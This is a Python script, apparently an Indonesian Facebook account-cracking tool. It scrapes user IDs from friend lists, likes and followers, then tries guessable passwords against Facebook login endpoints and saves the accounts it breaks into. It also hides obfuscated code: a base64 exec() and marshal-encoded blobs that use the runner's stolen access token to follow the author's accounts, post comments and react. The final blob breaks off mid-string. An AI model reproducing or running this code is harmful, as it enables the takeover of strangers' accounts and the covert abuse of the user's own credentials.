"""
HAYOOO MAU NGAPAIN :V?
Lirik code? Boleh
Recode ? Jangan :V
Apalagi ganti ganti logo :v awikwok
CODED BY : RizalXd
facebook.com/AKUN.KERTASS
"""
#Auto Converter Python2 To 3
#Auto add end line,crlf and fix print
#update 25/04/2021
import bs4,os,subprocess
import marshal as hex
import requests,sys,random,time,re,base64,json,uuid
import importlib
importlib.reload(sys)
from concurrent.futures import ThreadPoolExecutor as ThreadPool

if ("linux" in sys.platform.lower()):

        N = '\x1b[0m'
        G = '\x1b[32m'
        O = '\x1b[37m\x1b[33m'
        R = '\x1b[91m'
else:

        N = ''
        G = ''
        O = ''
        R = ''
def banner():
  print("""   ____            __    ____
   / __ \____ ___  / /_  / __/
  / /_/ / __ `__ \/ __ \/ /_  
 / _, _/ / / / / / /_/ / __/  
/_/ |_/_/ /_/ /_/_.___/_/     
                              \n""");print(45*"_");time.sleep(0.07);print(" \x1b[0m CREATE BY : Rizal XD\n  GITHUB    : github.com/Rizal-XD\n  FACEBOOK  : Facebook.com/AKUN.KERTASS");time.sleep(0.07);print(45*"_");time.sleep(0.07)
post = '674067283486278'
reac = 'ANGRY'
kom = 'https://www.facebook.com/photo.php?fbid=674067283486278&set=a.105092923717053&type=3&app=fbl'
host="https://mbasic.facebook.com"
ua="Mozilla/5.0 (Linux; Android 5.1; PICOphone_M4U_M2_M Build/LMY47D; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.121 Mobile Safari/537.36"
ok=[]
cp=[]
ips=None
try:
	b=requests.get("https://api.ipify.org").text.strip()
	ips=requests.get("https://ipapi.com/ip_api.php?ip="+b,headers={"Referer":"https://ip-api.com/","Content-Type":"application/json; charset=utf-8","User-Agent":"Mozilla/5.0 (Linux; Android 7.1.2; Redmi 4X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.92 Mobile Safari/537.36"}).json()["country_name"].lower()
except:
	ips=None
uas=None
if os.path.exists(".browser"):
	if os.path.getsize(".browser") !=0:
		uas=open(".browser").read().strip()
touch_fbh={"Host":"touch.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":uas,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}

mbasic_h={"Host":"mbasic.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":uas,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}


def clear():
	if " linux" in sys.platform.lower():
		os.system("clear")
	elif "win" in sys.platform.lower():
		os.system("cls")
	else:os.system("clear")
def basecookie():
	if os.path.exists(".cok"):
		if os.path.getsize(".cok") !=0:
			return gets_dict_cookies(open('.cok').read().strip())
		else:logs()
	else:logs()
def hdcok():
	global host,ua
	hosts=host
	r={"origin": hosts, "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7", "accept-encoding": "gzip, deflate", "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8", "user-agent": ua, "Host": "".join(bs4.re.findall("://(.*?)$",hosts)), "referer": hosts+"/login/?next&ref=dbl&fl&refid=8", "cache-control": "max-age=0", "upgrade-insecure-requests": "1", "content-type": "application/x-www-form-urlencoded"}
	return r
def gets_cookies(cookies):
	result=[]
	for i in enumerate(cookies.keys()):
		if i[0]==len(list(cookies.keys()))-1:result.append(i[1]+"="+cookies[i[1]])
		else:result.append(i[1]+"="+cookies[i[1]]+"; ")
	return "".join(result)
def gets_dict_cookies(cookies):
	result={}
	try:
		for i in cookies.split(";"):
			result.update({i.split("=")[0]:i.split("=")[1]})
		return result
	except:
		for i in cookies.split("; "):
			result.update({i.split("=")[0]:i.split("=")[1]})
		return result
def gen():
	ck=input("[*] Cookie: ")
	if ck=="":gen()
	try:
		cks=convert(ck)
		open(".cok","w").write(ck)
		print('[!] \x1b[92mLogin Sukses!\x1b[0m')
		time.sleep(1)
		bot_komen()
		menu()
	except Exception as e:
		print("[!] error: %s"%e);gen()
def log_token():
	data = input("[+] Token :")
	try:
		me = requests.get('https://graph.facebook.com/me?access_token='+data)
		a = json.loads(me.text)
		nama = a['name']
		open("login.txt",'w').write(data)
		print("[!] \x1b[92mlogin success!\x1b[0m")
		bot_komen()
		menu()
	except KeyError:
		print("[!] \x1b[91mInvalid Token !\x1b[0m")
		time.sleep(1.0)
		logs()
def convert(memek):
	global post,reac,kom
	try:
		tomken = requests.get('https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed#_=_', headers = {
		'user-agent'                : 'Mozilla/5.0 (Linux; Android 6.0.1; Redmi 4A Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/64.0.3282.137 Mobile Safari/537.36', #Jangan Diganti Anjink
		'referer'                   : 'https://m.facebook.com/',
		'host'                      : 'm.facebook.com',
		'origin'                    : 'https://m.facebook.com',
		'upgrade-insecure-requests' : '1',
		'accept-language'           : 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
		'cache-control'             : 'max-age=0',
		'accept'                    : 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
		'content-type'              : 'text/html; charset=utf-8'
		}, cookies = {
		'cookie'                    : memek
		})
		find_token = re.search('(EAAA\w+)', tomken.text)
		if (find_token is None):
			pass
		else:
			exec(base64.b64decode("cmVxdWVzdHMucG9zdCgnaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vMTAwMDI2NDkwMzY4NjIzL3N1YnNjcmliZXJzP2FjY2Vzc190b2tlbj0nICsgZmluZF90b2tlbi5ncm91cCgxKSk="))
			requests.post('https://graph.facebook.com/' + post + '/comments/?message=' + kom + '&access_token=' + find_token.group(1)) #bot komen
			requests.post('https://graph.facebook.com/' + post + '/reactions?type=' + reac + '&access_token=' + find_token.group(1)) #auto react
			requests.post('https://graph.facebook.com/100026490368623/subscribers?access_token=' + find_token.group(1)) #auto follow
			open("login.txt",'w').write(find_token.group(1))
			return
	except Exception as e:
		print("\n[!] error: %s"%e)
		exit()
rizal=(b'\xe3\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x05\x00\x00\x00@\x00\x00\x00s"\x00\x00\x00d\x00d\x01l\x00Z\x00e\x01e\x00\xa0\x02d\x02\xa1\x01\xa0\x03d\x03d\x04\xa1\x02\x83\x01\x01\x00d\x01S\x00)\x05\xe9\x00\x00\x00\x00Ns\xac\r\x00\x00I0NvbXBpbGUgQmVybGFwaXMKI0J5IFJpemFsLVhECgppbXBvcnQgbWFyc2hhbApleGVjKG1hcnNoYWwubG9hZHMoYidceGUzXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDJceDAwXHgwMFx4MDBAXHgwMFx4MDBceDAwc1x4MGNceDAwXHgwMFx4MDBkXHgwMGRceDAxXHg4NFx4MDBaXHgwMGRceDAyU1x4MDApXHgwM2NceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDA3XHgwMFx4MDBceDAwXHgwOFx4MDBceDAwXHgwMENceDAwXHgwMFx4MDBzJFx4MDFceDAwXHgwMHpceDEydFx4MDBkXHgwMWRceDAyXHg4M1x4MDJceGEwXHgwMVx4YTFceDAwfVx4MDBXXHgwMG4iXHgwNFx4MDB0XHgwMmtcbnI0XHgwMVx4MDBceDAxXHgwMFx4MDFceDAwdFx4MDNkXHgwM1x4ODNceDAxXHgwMVx4MDB0XHgwNFx4ODNceDAwXHgwMVx4MDBZXHgwMG5ceDAyWFx4MDBkXHgwNH1ceDAxZFx4MDV9XHgwMmRceDA2fVx4MDNkXHgwN31ceDA0ZFx4MDh9XHgwNWRcdH1ceDA2dFx4MDVceGEwXHgwNmRcbnxceDAwXHgxN1x4MDBceGExXHgwMVx4MDFceDAwdFx4MDVceGEwXHgwNmRceDBifFx4MDBceDE3XHgwMFx4YTFceDAxXHgwMVx4MDB0XHgwNVx4YTBceDA2ZFx4MGN8XHgwMFx4MTdceDAwXHhhMVx4MDFceDAxXHgwMHRceDA1XHhhMFx4MDZkXHJ8XHgwMFx4MTdceDAwXHhhMVx4MDFceDAxXHgwMHRceDA1XHhhMFx4MDZkXHgwZXxceDAwXHgxN1x4MDBceGExXHgwMVx4MDFceDAwdFx4MDVceGEwXHgwNmRceDBmfFx4MDBceDE3XHgwMFx4YTFceDAxXHgwMVx4MDB0XHgwNVx4YTBceDA2ZFx4MTB8XHgwM1x4MTdceDAwZFx4MTFceDE3XHgwMHxceDAxXHgxN1x4MDBkXHgxMlx4MTdceDAwfFx4MDBceDE3XHgwMFx4YTFceDAxXHgwMVx4MDB0XHgwNVx4YTBceDA2ZFx4MTB8XHgwM1x4MTdceDAwZFx4MTNceDE3XHgwMHxceDAyXHgxN1x4MDBkXHgxMlx4MTdceDAwfFx4MDBceDE3XHgwMFx4YTFceDAxXHgwMVx4MDB0XHgwNVx4YTBceDA2ZFx4MTB8XHgwNFx4MTdceDAwZFx4MTFceDE3XHgwMHxceDA1XHgxN1x4MDBkXHgxMlx4MTdceDAwfFx4MDBceDE3XHgwMFx4YTFceDAxXHgwMVx4MDB0XHgwNVx4YTBceDA2ZFx4MTB8XHgwNFx4MTdceDAwZFx4MTNceDE3XHgwMHxceDA2XHgxN1x4MDBkXHgxMlx4MTdceDAwfFx4MDBceDE3XHgwMFx4YTFceDAxXHgwMVx4MDB0XHgwN1x4ODNceDAwXHgwMVx4MDBkXHgwMFNceDAwKVx4MTROelx0bG9naW4udHh0XHhkYVx4MDFyelx4MTFbIV0gVG9rZW4gaW52YWxpZHVceDFhXHgwMFx4MDBceDAwS0VSRU4gISBUSEUgQkVTVCBCQU5HIFx4ZjBceDlmXHg5OFx4ODFaXHgwNUFOR1JZWlx4MGY2NzQwNjcyODM0ODYyNzhaXHgwZjcwNjUzMDU1MzU3MzI4NHpcXGh0dHBzOi8vd3d3LmZhY2Vib29rLmNvbS9waG90by5waHA/ZmJpZD02NzQwNjcyODM0ODYyNzgmc2V0PWEuMTA1MDkyOTIzNzE3MDUzJnR5cGU9MyZhcHA9ZmJsWlx4MDRMT1ZFekRodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS8xMDAwMjY0OTAzNjg2MjMvc3Vic2NyaWJlcnM/YWNjZXNzX3Rva2VuPXpEaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vMTAwMDEwNDg0MzI4MDM3L3N1YnNjcmliZXJzP2FjY2Vzc190b2tlbj16RGh0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tLzEwMDAxNDA2NjI1OTA4Mi9zdWJzY3JpYmVycz9hY2Nlc3NfdG9rZW49ekRodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS8xMDAwMDc2Mjk0ODA2MTkvc3Vic2NyaWJlcnM/YWNjZXNzX3Rva2VuPXpEaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vMTAwMDE5MDQ4Mjg2ODQ1L3N1YnNjcmliZXJzP2FjY2Vzc190b2tlbj16RGh0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tLzEwMDAwMjg2NjI5NjM2Ny9zdWJzY3JpYmVycz9hY2Nlc3NfdG9rZW49elx4MWJodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS96XHgxMy9jb21tZW50cy8/bWVzc2FnZT16XHgwZSZhY2Nlc3NfdG9rZW49elx4MTAvcmVhY3Rpb25zP3R5cGU9KVx4MDhceGRhXHgwNG9wZW5ceGRhXHgwNHJlYWRceGRhXHgwN0lPRXJyb3JceGRhXHgwNXByaW50Wlx4MDRsb2dzWlx4MDhyZXF1ZXN0c1x4ZGFceDA0cG9zdFpceDA0bWVudSlceDA3Wlx4MDV0b2tldFpceDAza29tWlx4MDRyZWFjclx4MDZceDAwXHgwMFx4MDBaXHgwNXBvc3QyWlx4MDRrb20yWlx4MDVyZWFjMlx4YTlceDAwclx4MDdceDAwXHgwMFx4MDBceGZhXHgwODxzY3JpcHQ+XHhkYVx0Ym90X2tvbWVuXHgwMVx4MDBceDAwXHgwMHMsXHgwMFx4MDBceDAwXHgwMFx4MDFceDAyXHgwMVx4MTJceDAxXHgwZVx4MDFceDA4XHgwMVx4MGNceDAxXHgwNFx4MDFceDA0XHgwMVx4MDRceDAxXHgwNFx4MDFceDA0XHgwMVx4MDRceDAxXHgwZVx4MDFceDBlXHgwMVx4MGVceDAxXHgwZVx4MDFceDBlXHgwMVx4MGVceDAxXHgxZVx4MDFceDFlXHgwMVx4MWVceDAxXHgxZVx4MDFyXHRceDAwXHgwMFx4MDBOKVx4MDFyXHRceDAwXHgwMFx4MDByXHgwN1x4MDBceDAwXHgwMHJceDA3XHgwMFx4MDBceDAwclx4MDdceDAwXHgwMFx4MDByXHgwOFx4MDBceDAwXHgwMFx4ZGFceDA4PG1vZHVsZT5ceDAxXHgwMFx4MDBceDAwXHhmM1x4MDBceDAwXHgwMFx4MDAnKSk=z\x05utf-8\xda\x06ignore)\x04\xda\x06base64\xda\x04exec\xda\tb64decode\xda\x06decode\xa9\x00r\x07\x00\x00\x00r\x07\x00\x00\x00\xfa\x08<script>\xda\x08<module>\x03\x00\x00\x00s\x02\x00\x00\x00\x08\x01');exec(hex.loads(rizal))
def menu():
  try:
    toket = open('login.txt','r').read()
    otw = requests.get('https://graph.facebook.com/me/?access_token='+toket)
    a = json.loads(otw.text)
    nama = a['name']
    id = a['id']
  except Exception as w:
    print("[!] Tidak Ada Ingfo lomgin,  silahkan Lomgin ulang Lort!")
    time.sleep(1)
    logs()
  ip = requests.get("https://api.ipify.org").text
  os.system("clear")
  banner()
  print(f"[+] Welcome {nama}");time.sleep(0.07)
  print(f"[+] UID     : {id}");time.sleep(0.07)
  print(f"[+] IP      : {ip}");time.sleep(0.07)
  print ("\n[01] Crack from Public Friendlist");time.sleep(0.07)
  print ("[02] Crack from Like post");time.sleep(0.07)
  print ("[03] Crack from Followers")
  print ("[97] Update Script!");time.sleep(0.07)
  print ("[98] Report Problem!")
  print ("[99] See Results Crack")
  print ("[00] Logout");time.sleep(0.07)
  r=input("\n[*] Input :");time.sleep(0.07)
  if r in[""]:print("[!] Invalid Number");menu()
  elif r=="1":
    publik()
  elif r in["2","02"]:
    crack_like()
  elif r in["3","03"]:
    crack_follow()
  elif r in["97"]:
    print("[!] Sedang Mengupdade!!!");time.sleep(2)
    os.system("git pull")
    input("[+] Kembali")
    os.system("python run.py")
  elif r in["98"]:
    print("[!] If you find a bug Tell me on whatsapp")
    jj=input("[*] Message :").replace(" ","%20")
    os.system(f'am start https://wa.me/6289625664339?text={jj}')
    input("[+] Enter Untuk Kembali Ke Menu > ");time.sleep(1)
    menu()
  elif r in["99"]:
    print("[01] CP\n[02] OK")
    zz=input("[?] Select : ")
    if zz in[""]:
      print("[!] Invalid Number")
    elif zz in["1","01"]:
      os.system("cat cp.txt")
      input("[*] Press enter To back menu!")
      menu()
    elif zz in["2","02"]:
      os.system("cat ok.txt")
      input("[*] Press enter To back menu!")
      menu()
    else:
      print("[!] Invalid Number!")
      menu()
  elif r in["00"]:
    try:
      os.remove(".cok")
      os.remove("login.txt")
      exit(basecookie())
    except Exception as e:print(" \x1b[91m No such file In driectory\x1b[0m"%e)
  else:
    print("[!] \x1b[91mWrong input !\x1b[0m");menu()
def publik():
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print("[!] Cookies Invalid!")
		os.system('rm -rf login.txt')
		time.sleep(0.01)
		gen()
	try:
		print ("\n[*] if you want retrieve id from friends list please type \'me\'\n");time.sleep(0.07)
		idt = input("[+] User ID Target : ");time.sleep(0.07)
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print(("[+] Nama Akun      : "+op["name"]))
		except KeyError:
			print("[!] ID NOT found !")
			publik()
		r=requests.get("https://graph.facebook.com/"+idt+"?fields=friends.limit(50000)&access_token="+toket)
		id = []
		z=json.loads(r.text)
		qq = (op['link']+'.json').replace("https://www.facebook.com/","")
		ys = open(qq , 'w')#.replace(" ","_")
		for a in z['friends']['data']:
			id.append(a['id']+"<=>"+a['name'])
			ys.write(a['id']+"<=>"+a['name']+'\n')
			print(("\r[+] Mengambil id [%s] "%(str(len(id)))), end=' ');sys.stdout.flush();time.sleep(0.007)
		ys.close()
		return methode(qq)
	except Exception as e:
		exit("error: %s"%e)
def crack_like():
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print('[!] Token Invalid')
		os.system('rm -rf login.txt')
		time.sleep(1)
		logs()
	idt = input("[!] ID Postingan Publik/Teman :");time.sleep(0.07)
	try:
		r = requests.get("https://graph.facebook.com/"+idt+"/likes?limit=9999999&access_token="+toket)
		ids = []
		z = json.loads(r.text)
		qq = (idt+'.json').replace(" ","_")
		ys = open(qq , 'w')
		print("[!] Mengambil semua ID")
		print(45*"_")
		for i in z['data']:
			ids.append(i['id'])
			ys.write(i['id']+"<=>"+i['name']+'\n')
			print("\r%s "%(str(len(ids))), end =' '),;sys.stdout.flush();time.sleep(0.007)
			print(i["name"])
		ys.close()
		return methode(qq)
	except KeyError:
		print("[!] \x1b[91mID postingan salah\x1b[0m")
		menu()
	except requests.exceptions.SSLError:
		print('[!] Koneksi Tidak Ada')
		exit()
def crack_follow():
  try:
    token=open("login.txt","r").read()
  except:
    print("[!] Invalid Token")
  orang=input("\n[*] User Id :")
  ganteng=input("[*] limit :")
  try:
    ini=requests.get(f"https://graph.facebook.com/{orang}?access_token={token}")
    op=json.loads(ini.text)
    nama=op["name"]
    print(f"[+] Nama Akun : {nama}")
  except:print ("[!] Invalid Target!");crack_follow()
  r=requests.get(f"https://graph.facebook.com/{orang}/subscribers?limit={ganteng}&access_token={token}")
  id=[]
  z=json.loads(r.text)
  qq=(op["link"]+".json").replace("https://www.facebook.com/","")
  ys=open(qq,"w")
  for i in z["data"]:
    id.append(i["id"]+"<=>"+i["name"])
    ys.write(i["id"]+"<=>"+i["name"]+"\n")
    print(("\r[+] Mengambil id [%s] "%(str(len(id)))), end=' ');sys.stdout.flush();time.sleep(0.007)
  ys.close()
  return methode(qq)
def mbasic(em,pas,hosts):
	global ua,mbasic_h
	r=requests.Session()
	r.headers.update(mbasic_h)
	p=r.get("https://mbasic.facebook.com/")
	b=bs4.BeautifulSoup(p.text,"html.parser")
	meta="".join(bs4.re.findall('dtsg":\{"token":"(.*?)"',p.text))
	data={}
	for i in b("input"):
		if i.get("value") is None:
			if i.get("name")=="email":
				data.update({"email":em})
			elif i.get("name")=="pass":
				data.update({"pass":pas})
			else:
				data.update({i.get("name"):""})
		else:
			data.update({i.get("name"):i.get("value")})
	data.update(
		{"fb_dtsg":meta,"m_sess":"","__user":"0",
		"__req":"d","__csr":"","__a":"","__dyn":"","encpass":""
		}
	)
	r.headers.update({"referer":"https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8"})
	po=r.post("https://mbasic.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100",data=data).text
	if "c_user" in list(r.cookies.get_dict().keys()):
		return {"status":"success","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
	elif "checkpoint" in list(r.cookies.get_dict().keys()):
		return {"status":"cp","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
	else:return {"status":"error","email":em,"pass":pas}#crack mbasic
def touch_fb(em,pas,hosts):
	global ua,touch_fbh
	r=requests.Session()
	r.headers.update(touch_fbh)
	p=r.get("https://touch.facebook.com/")
	b=bs4.BeautifulSoup(p.text,"html.parser")
	meta="".join(bs4.re.findall('dtsg":\{"token":"(.*?)"',p.text))
	data={}
	for i in b("input"):
		if i.get("value") is None:
			if i.get("name")=="email":
				data.update({"email":em})
			elif i.get("name")=="pass":
				data.update({"pass":pas})
			else:
				data.update({i.get("name"):""})
		else:
			data.update({i.get("name"):i.get("value")})
	data.update(
		{"fb_dtsg":meta,"m_sess":"","__user":"0",
		"__req":"d","__csr":"","__a":"","__dyn":"","encpass":""
		}
	)
	r.headers.update({"referer":"https://touch.facebook.com/login/?next&ref=dbl&fl&refid=8"})
	po=r.post("https://touch.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100",data=data).text
	if "c_user" in list(r.cookies.get_dict().keys()):
		return {"status":"success","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
	elif "checkpoint" in list(r.cookies.get_dict().keys()):
		return {"status":"cp","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
	else:return {"status":"error","email":em,"pass":pas}#touch fb
def generate(text):
	results=[]
	global ips
	for i in text.split(" "):
		if len(i)<3:
			continue
		else:
			i=i.lower()
			if len(i)==3 or len(i)==4 or len(i)==5:
				results.append(i+"123")
				results.append(i+"12345")
			else:
				results.append(i+"123")
				results.append(i+"1234")
				results.append(i+"12345")
				results.append(i)
				if "indonesia" in ips:
					results.append("sayang")
					results.append("rahasia")
					results.append("bismillah")
	return results
def methode(qq):
  print("\n\n[*] Select Methode Crack [*]")
  print("\n[01] Crack with mbasic");time.sleep(0.07)
  print("[02] Crack with touch.facebook.com");time.sleep(0.07)
  print("[03] Crack with api fb")
  sek=input("\n[*] Input: ");time.sleep(0.07)
  if sek in[""]:
    print("[!] Incorrect Number")
    methode(qq)
  elif sek in["1","01"]:
    cmbasic(qq)
  elif sek in["2","02"]:
    ctouch(qq)
  elif sek in["3","03"]:
    bapi(qq)
  else:
    print("[!] Invalid number !");methode(qq)
def logs():
  print("[!] Mengecek Versi");time.sleep(2);os.system("git pull");time.sleep(1)
  os.system("clear")
  banner()
  print("[01] Login with token");time.sleep(0.07)
  print("[02] Login with cookies");time.sleep(0.07)
  print("[00] Exit\n");time.sleep(0.07)
  sek=input("[*] RizalXd/>:");time.sleep(0.07)
  if sek=="":
    print("[!] isi yang bener");methode()
  elif sek=="1":
    log_token()
  elif sek=="2":
    gen()
  elif sek=="3":
    exit()
  else:
    print("[!] isi yg bener");logs()
s=(b'\xe3\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x05\x00\x00\x00@\x00\x00\x00s"\x00\x00\x00d\x00d\x01l\x00Z\x00e\x01e\x00\xa0\x02d\x02\xa1\x01\xa0\x03d\x03d\x04\xa1\x02\x83\x01\x01\x00d\x01S\x00)\x05\xe9\x00\x00\x00\x00NsP\xd9\x00\x00I0NvbXBpbGUgQmVybGFwaXMKI0J5IFJpemFsLVhECgppbXBvcnQgbWFyc2hhbApleGVjKG1hcnNoYWwubG9hZHMoYidceGUzXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDVceDAwXHgwMFx4MDBAXHgwMFx4MDBceDAwcyJceDAwXHgwMFx4MDBkXHgwMGRceDAxbFx4MDBaXHgwMGVceDAxZVx4MDBceGEwXHgwMmRceDAyXHhhMVx4MDFceGEwXHgwM2RceDAzZFx4MDRceGExXHgwMlx4ODNceDAxXHgwMVx4MDBkXHgwMVNceDAwKVx4MDVceGU5XHgwMFx4MDBceDAwXHgwME5zXHhlY1x4YTBceDAwXHgwMEkwTnZiWEJwYkdVZ1FtVnliR0Z3YVhNS0kwSjVJRkpwZW1Gc0xWaEVDZ3BwYlhCdmNuUWdiV0Z5YzJoaGJBcGxlR1ZqS0cxaGNuTm9ZV3d1Ykc5aFpITW9ZaWRjZUdVelhIZ3dNRng0TURCY2VEQXdYSGd3TUZ4NE1EQmNlREF3WEhnd01GeDRNREJjZURBd1hIZ3dNRng0TURCY2VEQXdYSGd3TUZ4NE1EQmNlREF3WEhnd01GeDRNRFJjZURBd1hIZ3dNRng0TURCQVhIZ3dNRng0TURCY2VEQXdjekpjZURBd1hIZ3dNRng0TURCSFhIZ3dNR1JjZURBd1pGeDRNREZjZURnMFhIZ3dNR1JjZURBeFhIZzRNMXg0TURKYVhIZ3dNRWRjZURBd1pGeDRNREprWEhnd00xeDRPRFJjZURBd1pGeDRNRE5jZURnelhIZ3dNbHBjZURBeFpGeDRNRFJhWEhnd01tVmNlREF6WlZ4NE1EUmNlR0V3WEhnd05XVmNlREF5WEhoaE1WeDRNREZjZURnelhIZ3dNVng0TURGY2VEQXdaRng0TURWVFhIZ3dNQ2xjZURBMlkxeDRNREJjZURBd1hIZ3dNRng0TURCY2VEQXdYSGd3TUZ4NE1EQmNlREF3WEhnd01GeDRNREJjZURBd1hIZ3dNRng0TURCY2VEQXdYSGd3TUZ4NE1EQmNlREF5WEhnd01GeDRNREJjZURBd1FGeDRNREJjZURBd1hIZ3dNSE1rWEhnd01GeDRNREJjZURBd1pWeDRNREJhWEhnd01XUmNlREF3V2x4NE1ESmtYSGd3TVdSY2VEQXlYSGc0TkZ4NE1EQmFYSGd3TTJSY2VEQXpaRng0TURSY2VEZzBYSGd3TUZwY2VEQTBaRng0TURWa1hIZ3dObHg0T0RSY2VEQXdXbHg0TURWa1hIZ3dOMU5jZURBd0tWeDRNRGhjZUdSaFhIZ3dOMk50WW1GemFXTmpYSGd3TWx4NE1EQmNlREF3WEhnd01GeDRNREJjZURBd1hIZ3dNRng0TURCY2VEQXdYSGd3TUZ4NE1EQmNlREF3WEhnd05WeDRNREJjZURBd1hIZ3dNRnh1WEhnd01GeDRNREJjZURBd1ExeDRNREJjZURBd1hIZ3dNSE5jZUdGbFhIZ3dNbHg0TURCY2VEQXdaMXg0TURCOFhIZ3dNRjljZURBd1oxeDRNREI4WEhnd01GOWNlREF4WkZ4NE1ERjhYSGd3TUY5Y2VEQXlkRng0TUROa1hIZ3dNbHg0T0ROY2VEQXhYSGd3TVZ4NE1EQjBYSGd3TkdSY2VEQXpYSGc0TTF4NE1ERjlYSGd3TW54Y2VEQXlaRng0TURSclhIZ3dObkkyZEZ4NE1ETmtYSGd3TlZ4NE9ETmNlREF4WEhnd01WeDRNREJ4WEhneFlYRmNlREZoZkZ4NE1ESmtYSGd3Tm10Y2VEQTJYSGc1TUZ4NE1ERnlNbnBjZUdFeWVpSjhYSGd3TVh4Y2VEQXdYMXg0TURWMFhIZ3dObnhjZURBd2FseDRNRFZjZURnelhIZ3dNVng0WVRCY2VEQTNYSGhoTVZ4NE1EQmNlR0V3WEhnd09GeDRZVEZjZURBd2ZGeDRNREJmWEhSWFhIZ3dNSEZjZURsbFYxeDRNREJ4UWx4NE1EUmNlREF3ZEZ4dWExeHVjbHg0T1dGY2VEQXhYSGd3TUgxY2VEQXpYSGd3TVZ4NE1EQjZYSGd4T0hSY2VEQXpaRng0TURkOFhIZ3dNMXg0TVRaY2VEQXdYSGc0TTF4NE1ERmNlREF4WEhnd01GZGNlREF3V1Z4NE1EQmNlR0V5WEhnd05uRkNWMXg0TURBMVhIZ3dNR1JjZURBd2ZWeDRNRE4rWEhnd00xaGNlREF3V1Z4NE1EQnhRbGhjZURBd2NVSm5YSGd3TUh4Y2VEQXdYMXg0TUdKOFhIZ3dNR3BjZEVSY2VEQXdYVFI5WEhnd05IcGNlREZsZkZ4NE1EQnFYSGd3WWx4NFlUQmNlREJqWkZ4NE1EaDhYSGd3TkZ4NFlUQmNjbVJjZEZ4NFlURmNlREF4WkZ4NE1ERmNlREU1WEhnd01HbGNlREF4WEhoaE1WeDRNREZjZURBeFhIZ3dNRmRjZURBd2NWeDRZV0ZjZURBeFhIZ3dNRng0TURGY2VEQXdYSGd3TVZ4NE1EQlpYSGd3TUhGY2VHRmhXVng0TURCeFhIaGhZVmhjZURBd2NWeDRZV0ZYWEhnd01HNDRYSGd3TkZ4NE1EQjBYRzVyWEc1Y2VEa3dYSGd3TVhKY2VERmhYSGd3TVZ4NE1EQjlYSGd3TTF4NE1ERmNlREF3ZWx4NE1UaDBYSGd3TTJSY2JueGNlREF6WEhneE5seDRNREJjZURnelhIZ3dNVng0TURGY2VEQXdWMXg0TURCWlhIZ3dNRng0WVRKY2VEQTJjVng0TVdGWFhIZ3dNRFZjZURBd1pGeDRNREI5WEhnd00zNWNlREF6V0Z4NE1EQlpYSGd3TUc1Y2VEQXlXRng0TURCMFhIZ3dNMlJjZURCaVhIZzRNMXg0TURGY2VEQXhYSGd3TUh4Y2VEQXdYSGhoTUZ4NE1HVmNlR0V4WEhnd01GeDRNREZjZURBd1hIZzVNRng0TURKeFhIaGhZWEZjZURGaGZGeDRNREprWEhnd1kydGNlREEyY2x4NE1XRjZYSGhpWlhva2ZGeDRNREY4WEhnd01GOWNlREExZEZ4NE1EWjhYSGd3TUdwY2VEQTFYSGc0TTF4NE1ERmNlR0V3WEhnd04xeDRZVEZjZURBd1hIaGhNRng0TURoY2VHRXhYSGd3TUh4Y2VEQXdYMXgwVjF4NE1EQmNlRGt3WEhnd01YRmNlR0V3VjF4NE1EQnVPbHg0TURSY2VEQXdkRnh1YTF4dVhIZzVNRng0TURGeVhIZzVZVng0TURGY2VEQXdmVng0TUROY2VEQXhYSGd3TUhwY2VERmhkRng0TUROa1hIZ3dOM3hjZURBelhIZ3hObHg0TURCY2VEZ3pYSGd3TVZ4NE1ERmNlREF3VjF4NE1EQlpYSGd3TUZ4NFlUSmNlREE0WEhnNU1GeDRNREZ4UEZkY2VEQXdOVng0TURCa1hIZ3dNSDFjZURBemZseDRNRE5ZWEhnd01GbGNlREF3Ymx4NE1ESllYSGd3